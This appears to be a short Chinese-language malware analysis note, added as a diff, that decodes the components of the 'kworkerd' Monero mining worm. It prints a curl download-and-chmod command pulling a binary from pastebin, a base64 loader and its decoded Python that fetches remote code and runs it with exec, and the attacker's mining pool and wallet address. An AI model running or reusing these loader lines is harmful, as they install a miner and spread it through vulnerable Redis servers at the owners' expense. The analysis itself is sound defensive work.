@@ -1,1 +1,35 @@
 kworkerd 已经全部解码
+
+(1)5bjpjvLP --- 挖矿开始文件
+
+(2)Gw7mywhC --- 核心逻辑文件
+
+(3)Fj2YdETv --- dns文件
+
+// 对应：curl -fsSL https://pastebin.com/raw/Fj2YdETv -o /bin/dns && chmod 755 /bin/dns 
+
+(4)base64 --- 对应核心逻辑文件中的 
+I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSa3JTUWZFJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz
+
+这一段64位编码，这段编码解压出来如下：
+
+#coding: utf-8
+import urllib
+import base64
+
+d= 'https://pastebin.com/raw/eRkrSQfE'
+try:
+    page=base64.b64decode(urllib.urlopen(d).read())
+    exec(page)
+except:
+    pass
+
+(5)eRkrSQfE --- python 文件，用于redis漏洞攻击,文件当中的域名（icanhazip.com）用于存放入侵者的IP地址。同时用这个地址扩展B段进行扩散扫描
+
+
+(6)TzBeq3AM --- 用于判断核心逻辑文件是否需要升级
+
+备注：这个钱包地址目前正常使用中。
+
+矿池：stratum+tcp://xmr.f2pool.com:13531
+钱包地址：46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava
